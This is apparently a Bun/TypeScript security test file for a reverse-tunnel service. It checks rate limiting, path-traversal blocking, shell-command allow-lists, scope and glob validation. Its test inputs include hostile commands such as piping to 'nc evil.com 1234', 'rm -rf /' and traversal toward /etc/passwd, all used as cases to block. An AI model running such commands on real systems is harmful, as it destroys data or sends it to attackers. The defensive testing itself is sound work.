/**
 * Security Audit: Tunnel Security
 *
 * Tests reverse-tunnel security including rate limiting, permission enforcement,
 * path traversal protection, and scope validation.
 *
 * Attack vectors tested:
 *  - Rate limit bypass
 *  - Path traversal in filesystem scope
 *  - Shell command injection
 *  - Unauthorized port access
 *  - Permission expiration bypass
 *  - Scope validation bypass
 *  - Invalid capability injection
 *  - Glob pattern injection
 */

import { describe, test, expect } from 'bun:test';
import { resolve, normalize } from 'path';

// ---------------------------------------------------------------------------
// Replicate rate limiter for isolated testing
// ---------------------------------------------------------------------------

class TestTunnelRateLimiter {
  private buckets = new Map<string, { tokens: number; lastRefill: number }>();
  private configs: Record<string, { limit: number; windowMs: number }>;

  constructor(configs: Record<string, { limit: number; windowMs: number }>) {
    this.configs = configs;
  }

  check(endpoint: string, key: string): { allowed: boolean; retryAfterMs?: number } {
    const cfg = this.configs[endpoint];
    if (!cfg) return { allowed: true };

    const bucketKey = `${endpoint}:${key}`;
    const now = Date.now();
    let bucket = this.buckets.get(bucketKey);

    if (!bucket) {
      bucket = { tokens: cfg.limit - 1, lastRefill: now };
      this.buckets.set(bucketKey, bucket);
      return { allowed: true };
    }

    const elapsed = now - bucket.lastRefill;
    const refill = Math.floor((elapsed / cfg.windowMs) * cfg.limit);
    if (refill > 0) {
      bucket.tokens = Math.min(cfg.limit, bucket.tokens + refill);
      bucket.lastRefill = now;
    }

    if (bucket.tokens <= 0) {
      return { allowed: false, retryAfterMs: Math.max(cfg.windowMs - elapsed, 1000) };
    }

    bucket.tokens--;
    return { allowed: true };
  }
}

// ---------------------------------------------------------------------------
// Replicate permission validation for isolated testing
// ---------------------------------------------------------------------------

interface FilesystemScope {
  paths?: string[];
  operations?: string[];
  excludePatterns?: string[];
  maxFileSize?: number;
}

interface ShellScope {
  commands?: string[];
  workingDir?: string;
  maxTimeout?: number;
}

interface NetworkScope {
  ports?: number[];
  hosts?: string[];
  protocols?: string[];
}

function validateFilesystemPath(targetPath: string, allowedPaths: string[]): boolean {
  if (!allowedPaths.length) return true;
  return allowedPaths.some((allowed) => {
    const normalizedTarget = normalize(resolve(targetPath));
    const normalizedAllowed = normalize(resolve(allowed));
    return normalizedTarget === normalizedAllowed || normalizedTarget.startsWith(normalizedAllowed + '/');
  });
}

function validateShellCommand(command: string, allowedCommands: string[]): boolean {
  if (!allowedCommands.length) return true;
  const executable = command.split(/\s+/)[0];
  return allowedCommands.includes(executable);
}

function matchGlob(path: string, pattern: string): boolean {
  const regexStr = pattern
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
    .replace(/\*\*/g, '{{GLOBSTAR}}')
    .replace(/\*/g, '[^/]*')
    .replace(/\{\{GLOBSTAR\}\}/g, '.*');
  return new RegExp(`^${regexStr}$`).test(path);
}

// Scope validation replicas
const VALID_CAPABILITIES = new Set(['filesystem', 'shell', 'network', 'apps', 'hardware', 'desktop', 'gpu']);
const VALID_FS_OPERATIONS = new Set(['read', 'write', 'list', 'delete']);
const VALID_NET_PROTOCOLS = new Set(['http', 'tcp']);
const VALID_DESKTOP_FEATURES = new Set(['screenshot', 'mouse', 'keyboard', 'windows', 'apps', 'clipboard', 'accessibility']);

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Security Audit: Tunnel Security', () => {

  describe('Rate limiting', () => {
    test('RPC rate limit: 100 req/min', () => {
      const limiter = new TestTunnelRateLimiter({ rpc: { limit: 100, windowMs: 60_000 } });
      let allowed = 0;
      for (let i = 0; i < 150; i++) {
        if (limiter.check('rpc', 'tunnel-1').allowed) allowed++;
      }
      expect(allowed).toBe(100);
    });

    test('WebSocket connect rate limit: 5 req/min', () => {
      const limiter = new TestTunnelRateLimiter({ wsConnect: { limit: 5, windowMs: 60_000 } });
      let allowed = 0;
      for (let i = 0; i < 20; i++) {
        if (limiter.check('wsConnect', 'tunnel-1').allowed) allowed++;
      }
      expect(allowed).toBe(5);
    });

    test('permission request rate limit: 20 req/min', () => {
      const limiter = new TestTunnelRateLimiter({ permRequest: { limit: 20, windowMs: 60_000 } });
      let allowed = 0;
      for (let i = 0; i < 50; i++) {
        if (limiter.check('permRequest', 'tunnel-1').allowed) allowed++;
      }
      expect(allowed).toBe(20);
    });

    test('rate limits are per-key (tunnel isolation)', () => {
      const limiter = new TestTunnelRateLimiter({ rpc: { limit: 5, windowMs: 60_000 } });
      for (let i = 0; i < 5; i++) limiter.check('rpc', 'tunnel-1');
      expect(limiter.check('rpc', 'tunnel-1').allowed).toBe(false);
      expect(limiter.check('rpc', 'tunnel-2').allowed).toBe(true);
    });

    test('unknown endpoint allows all requests', () => {
      const limiter = new TestTunnelRateLimiter({});
      expect(limiter.check('unknown', 'key').allowed).toBe(true);
    });
  });

  describe('Filesystem path traversal protection', () => {
    test('allows access within allowed path', () => {
      expect(validateFilesystemPath('/home/user/project/file.txt', ['/home/user/project'])).toBe(true);
    });

    test('allows exact path match', () => {
      expect(validateFilesystemPath('/home/user/project', ['/home/user/project'])).toBe(true);
    });

    test('blocks path traversal with ../', () => {
      expect(validateFilesystemPath('/home/user/project/../../../etc/passwd', ['/home/user/project'])).toBe(false);
    });

    test('blocks absolute path outside allowed scope', () => {
      expect(validateFilesystemPath('/etc/shadow', ['/home/user/project'])).toBe(false);
    });

    test('blocks access to root', () => {
      expect(validateFilesystemPath('/', ['/home/user/project'])).toBe(false);
    });

    test('blocks sibling directory access', () => {
      expect(validateFilesystemPath('/home/other-user/secrets', ['/home/user/project'])).toBe(false);
    });

    test('handles normalized paths correctly', () => {
      expect(validateFilesystemPath('/home/user/project/./subdir/../file.txt', ['/home/user/project'])).toBe(true);
    });

    test('empty allowed paths means allow all', () => {
      expect(validateFilesystemPath('/any/path', [])).toBe(true);
    });
  });

  describe('Shell command validation', () => {
    test('allows whitelisted commands', () => {
      expect(validateShellCommand('ls -la', ['ls', 'cat', 'grep'])).toBe(true);
    });

    test('blocks non-whitelisted commands', () => {
      expect(validateShellCommand('rm -rf /', ['ls', 'cat'])).toBe(false);
    });

    test('extracts executable from command with args', () => {
      expect(validateShellCommand('cat /etc/passwd', ['cat'])).toBe(true);
    });

    test('blocks command injection via semicolons', () => {
      // The validation only checks the first word (executable)
      // The command "cat; rm -rf /" has executable "cat;" which is not in allowed list
      expect(validateShellCommand('cat;rm -rf /', ['cat'])).toBe(false);
    });

    test('blocks command with pipe injection', () => {
      expect(validateShellCommand('cat|nc evil.com 1234', ['cat'])).toBe(false);
    });

    test('empty allowed commands means allow all', () => {
      expect(validateShellCommand('any-command', [])).toBe(true);
    });

    test('blocks commands with path prefix', () => {
      expect(validateShellCommand('/bin/sh -c evil', ['ls', 'cat'])).toBe(false);
    });
  });

  describe('Scope validation', () => {
    test('valid capabilities are recognized', () => {
      for (const cap of ['filesystem', 'shell', 'network', 'apps', 'hardware', 'desktop', 'gpu']) {
        expect(VALID_CAPABILITIES.has(cap)).toBe(true);
      }
    });

    test('invalid capabilities are rejected', () => {
      for (const cap of ['admin', 'root', 'system', 'kernel', 'sudo']) {
        expect(VALID_CAPABILITIES.has(cap)).toBe(false);
      }
    });

    test('valid filesystem operations', () => {
      for (const op of ['read', 'write', 'list', 'delete']) {
        expect(VALID_FS_OPERATIONS.has(op)).toBe(true);
      }
    });

    test('invalid filesystem operations rejected', () => {
      for (const op of ['execute', 'chmod', 'chown', 'mount', 'symlink']) {
        expect(VALID_FS_OPERATIONS.has(op)).toBe(false);
      }
    });

    test('valid network protocols', () => {
      expect(VALID_NET_PROTOCOLS.has('http')).toBe(true);
      expect(VALID_NET_PROTOCOLS.has('tcp')).toBe(true);
    });

    test('rejected network protocols', () => {
      expect(VALID_NET_PROTOCOLS.has('udp')).toBe(false);
      expect(VALID_NET_PROTOCOLS.has('icmp')).toBe(false);
      expect(VALID_NET_PROTOCOLS.has('raw')).toBe(false);
    });

    test('port numbers must be valid (1-65535)', () => {
      const isValidPort = (p: number) => Number.isInteger(p) && p >= 1 && p <= 65535;
      expect(isValidPort(80)).toBe(true);
      expect(isValidPort(443)).toBe(true);
      expect(isValidPort(65535)).toBe(true);
      expect(isValidPort(0)).toBe(false);
      expect(isValidPort(-1)).toBe(false);
      expect(isValidPort(65536)).toBe(false);
      expect(isValidPort(1.5)).toBe(false);
    });
  });

  describe('Glob pattern matching', () => {
    test('matches simple wildcard', () => {
      expect(matchGlob('/tmp/test.txt', '/tmp/*.txt')).toBe(true);
    });

    test('wildcard does not cross directories', () => {
      expect(matchGlob('/tmp/subdir/test.txt', '/tmp/*.txt')).toBe(false);
    });

    test('globstar matches across directories', () => {
      expect(matchGlob('/tmp/a/b/c/test.txt', '/tmp/**')).toBe(true);
    });

    test('matches exact pattern', () => {
      expect(matchGlob('/etc/passwd', '/etc/passwd')).toBe(true);
    });

    test('does not match different path', () => {
      expect(matchGlob('/etc/shadow', '/etc/passwd')).toBe(false);
    });

    test('regex special characters in patterns are escaped', () => {
      // Ensure a pattern like "file.txt" matches literally, not "fileBtxt"
      expect(matchGlob('file.txt', 'file.txt')).toBe(true);
      expect(matchGlob('fileBtxt', 'file.txt')).toBe(false);
    });
  });

  describe('Permission expiration', () => {
    test('expired permissions are rejected', () => {
      const expiresAt = new Date(Date.now() - 1000);
      const now = new Date();
      expect(expiresAt < now).toBe(true);
    });

    test('non-expired permissions are allowed', () => {
      const expiresAt = new Date(Date.now() + 60_000);
      const now = new Date();
      expect(expiresAt > now).toBe(true);
    });

    test('null expiration means no expiry', () => {
      const expiresAt: Date | null = null;
      const shouldSkip = expiresAt !== null && new Date(expiresAt) < new Date();
      expect(shouldSkip).toBe(false);
    });
  });
});
